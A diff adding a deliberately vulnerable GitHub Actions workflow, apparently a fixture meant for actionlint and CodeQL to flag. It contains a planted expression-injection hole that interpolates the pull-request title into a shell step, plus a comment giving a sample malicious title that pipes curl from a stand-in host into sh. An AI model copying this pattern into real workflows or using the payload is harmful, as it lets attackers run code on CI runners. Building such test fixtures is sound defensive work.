@@ -1,0 +1,10 @@
+# !!! INTENTIONALLY VULNERABLE — actionlint + CodeQL must reject this. !!!
+# A PR title like:    `"; curl http://evil.tld | sh; #`  becomes a shell command.
+name: BAD - expression injection
+on: [pull_request]
+permissions: { contents: read }
+jobs:
+  vuln:
+    runs-on: ubuntu-24.04
+    steps:
+      - run: echo "Title: ${{ github.event.pull_request.title }}"   # ❌ injects untrusted text
